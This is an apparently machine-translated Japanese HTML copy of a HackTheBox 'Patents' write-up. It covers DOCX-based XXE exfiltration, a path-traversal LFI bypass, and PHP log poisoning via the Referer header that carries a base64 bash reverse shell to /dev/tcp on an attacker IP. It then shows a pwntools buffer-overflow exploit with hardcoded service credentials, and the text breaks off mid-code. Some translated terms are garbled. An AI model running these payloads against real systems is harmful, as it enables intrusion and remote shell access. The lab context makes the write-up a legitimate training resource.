<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👃🏾 💚 👃🏿 HackTheBox。特許を渡す。DOCX経由のXXE、LFIからRCE、GIT、およびROPチェーンファイル 👎 🚴🏽 👨‍🎨</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="私は、HackTheBoxサイトからさらに処理するために送信されたソリューションを引き続き公開しています。
 
 この記事では、DOCXドキュメントをPDFに変換するサービスでXXEを利用し、LFI経由でRCEを取得し、GIT履歴を調べてファイルを復元し、pwntoolsを使用してROPチェーンを構...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox。特許を渡す。DOCX経由のXXE、LFIからRCE、GIT、およびROPチェーンファイル</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="画像"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私は、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サイトから</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">さらに処理</font></a><font style="vertical-align: inherit;">するために送信されたソリューションを引き続き公開して</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">い</font></a><font style="vertical-align: inherit;">ます</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、DOCXドキュメントをPDFに変換するサービスでXXEを利用し、LFI経由でRCEを取得し、GIT履歴を調べてファイルを復元し、pwntoolsを使用してROPチェーンを構成し、隠しルートファイルを見つけます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実験室への接続はVPN経由です。</font><font style="vertical-align: inherit;">情報セキュリティの分野で何かを知っている人々とプライベートネットワークに行き着くため、仕事用のコンピュータや、重要なデータが利用可能なホストから接続しないことをお勧めします。</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">組織情報</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偵察</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このマシンのIPアドレスは10.10.10.173で、/ etc / hostsに追加しています。</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず、開いているポートをスキャンします。</font><font style="vertical-align: inherit;">nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。</font><font style="vertical-align: inherit;">tun0インターフェースからすべてのTCPおよびUDPポートを毎秒500パケットの速度でスキャンします。</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、ポートで動作するサービスの詳細については、-Aオプションを指定してスキャンを実行します。</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ホストはSSHサービスとApache Webサーバーを実行し、ポート8888は理解できないサービス用に予約されています。</font><font style="vertical-align: inherit;">ウェブを見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このサイトには、DOCXドキュメントのダウンロードフォームがあります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
声明によると、私たちのドキュメントはPDF形式に変換されます。これはXXEの考え方を示唆しています。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここから</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例をとり</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、この例では、ホストはリモートサーバーからxmlドキュメントをダウンロードしようとします。このドキュメントをダウンロードすることにより、ダウンロードしたxmlドキュメントで指定されたローカルファイルを読み取り、base64でエンコードし、エンコードされたファイルをリクエストパラメータとして渡してサーバーに再度アクセスします。つまり、このパラメーターをデコードしたら、リモートマシンからファイルを取得します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ただし、このロードは/ document.xmlパスという単語に配置しないでください。 OpenXML SDKはこのタイプのドキュメントを処理するために使用されるため</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、ここ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">ここから</font></a><font style="vertical-align: inherit;">続き</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、サーバー側のソフトウェアはword / document.xmlおよびcustomXML / item1.xmlでデータを検索します。したがって、そこに負荷をかける必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
docxドキュメントを作成して、zipアーカイブとして解凍しましょう。その後、customXMLディレクトリを作成し、その中にitem1.xmlファイルを作成します。その中で、上の画像からコードを書き、IPアドレスを自分のものに変更します。そして、ドキュメントをアーカイブします。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、ローカルWebサーバーを実行します。</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、現在のディレクトリに2番目のxmlファイルを作成し、/ etc / passwdを目的のファイルとして指定します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、ドキュメントをサーバーにアップロードします。 Webサーバーが実行されているウィンドウに、逆接続が表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
base64をデコードし、要求されたファイルを取得します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これにより、サーバー上のファイルを読み取ることができます。 Apache設定ファイルを読んでみましょう。これを行うには、dtd.xmlを変更して、ドキュメントのダウンロードを繰り返します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そこで、サイトが配置されているディレクトリを見つけます。設定ファイルを読んでみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、コメントは脆弱性のためにファイルが改名されたと言います。もちろん、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.phpを</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参照し</font><font style="vertical-align: inherit;">ます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このページに移動し、パス../../../../../etc/passwdをidパラメータとして渡すと、「../」のすべてのオカレンスがラインから削除されます。</font><font style="vertical-align: inherit;">各行の「../」を「... /。/」に置き換えてみましょう。シーケンスを削除しても、「../」が残ります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、LFIを見つけます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エントリーポイント</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これからRCEを取得してみましょう。</font><font style="vertical-align: inherit;">率直に言って、それは困難でした。</font><font style="vertical-align: inherit;">実際、そのような文書を送信する際、PDFのダウンロードの申し出はありませんでした。</font><font style="vertical-align: inherit;">つまり、記述子2が使用されました（診断メッセージとデバッグメッセージをテキスト形式で表示するため）。</font><font style="vertical-align: inherit;">そして私たちは彼の方を向くことができます。</font><font style="vertical-align: inherit;">base64でリバースシェルをエンコードしてみましょう。</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それをデコードして、phpのシステム関数に渡します。</font><font style="vertical-align: inherit;">ファイルをアップロードするときに、コードをHTTPヘッダーとして渡します。</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
netcatを実行します。</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、2番目の記述子について説明します。</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接続を取り戻します。 </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ルート1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトシステムをロードして、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">リンペア</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">転送し</font><font style="vertical-align: inherit;">、出力を注意深く分析します。</font><font style="vertical-align: inherit;">つまり、Dockerコンテナーで作業します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ハッシュも見つけます。</font><font style="vertical-align: inherit;">しかし、ハッキングすると、何も起こりません。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">実行して、実行中の</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">プロセス</font></a><font style="vertical-align: inherit;">を追跡します。</font><font style="vertical-align: inherit;">そして、プロセスの開始はrootとして見つかります。この場合、パスワードは環境変数として渡されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このパスワードを入力して、ローカルでユーザーを変更します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ルート2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このスクリプトの機能を見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
一部のlfmserverに関するヒントを入手し、ユーザー名とパスワードも保存します。</font><font style="vertical-align: inherit;">lfmに関連するすべてのシステムを調べてみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、このディレクトリにgitリポジトリがあります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このリポジトリを操作してみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
変更の履歴を見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
変更の履歴を見てみましょう。</font><font style="vertical-align: inherit;">したがって、最後から2番目のコミットでは、実行可能ファイルと説明が追加され、最後にはすでに削除されていることがわかります。</font><font style="vertical-align: inherit;">ファイルを削除する前にロールバックしましょう。</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、私たちのディレクトリに実行可能ファイルと説明が表示されました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここではすでにファイルを元に戻したいと思っていましたが、gitプロジェクトがあります！</font><font style="vertical-align: inherit;">ソースコードに言及したコミットを見つけました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、ファイルを復元しましょう。</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その後、対象のソースコード、プログラム自体、およびライブラリをローカルマシンにダウンロードします。 </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ロップ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムの脆弱性を見つけて悪用する必要があります。役立つソースコードがあります。</font><font style="vertical-align: inherit;">バイナリファイルで保護を確認してみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
つまり、カナリアとPIEはありませんが、スタックは実行できません。</font><font style="vertical-align: inherit;">あなたに便利な逆コンパイラを使用して逆アセンブラでバイナリファイルを開いて（IDA Pro 7.2を使用）、逆コンパイルしたコードをリポジトリのソースコードと比較してみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバーに接続し、checker.pyファイルのデータと資格情報を使用します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
エクスプロイトテンプレートを作成しましょう。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
リクエストを確認しましょう。</font><font style="vertical-align: inherit;">アプリケーションを起動します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルへのパスとその内容のハッシュを送信する必要があります。</font><font style="vertical-align: inherit;">たとえば、/ etc / hostsを使用しました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次のコードをテンプレートに追加します。</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、実行して404エラーを取得し</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ます。ログファイルを見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アプリケーションがファイルを探している場所は明らかです。パスをいじって、そのようなファイルを指定しましょう。</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コードを実行しますが、エラーは表示されません。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、urlencodeの場合、サーバーからコード200の応答が返されます。</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さて、逆アセンブラに戻りましょう。行（Shift + F12）の中でサーバー応答が成功していることがわかります。そして、それがアクセスされた場所を見てみましょう（X）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、最初の関数に進みます。最初の関数では、資格情報の検証が行われます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
逆コンパイラで理解しやすくするために、逆アセンブラウィンドウの変数行の名前を変更しましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
18から24行目でコードを解析して、次のことを理解します。ユーザー入力の一部が関数sub_402DB9に分類され、文字列が変数名に変換されてから、アクセス関数に分類され、結果が負の場合、メッセージ404が出力されます。したがって、変数名はファイルへのパスになります。リクエストはurlencodeエンコーディングでも処理されたので、この関数はおそらくデコードに必要です。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ただし、データが転送される変数名のサイズは限られています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、バッファオーバーフローの場合、0xA0 = 160バイトを転送する必要があります。最大160バイトを追加し、ファイルへのパスをエンコードする機能をコードに追加してみましょう。ハッシュはファイルの内容から計算されるため、ファイルパスの整合性に違反しないようにする必要があります。つまり、メインパスの後に0x00バイトを追加します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、実際には、サーバー上の任意のファイルからのハッシュを知る必要があります。ハッシュは常に利用可能であり、決して変更されません。たとえば、/ proc / sys / kernel / randomize_va_space、そしてlinPEASの出力から思い出すと、ASLRがアクティブになっています。つまり、ハッシュがわかっています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、コードを変更します。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
<font></font>
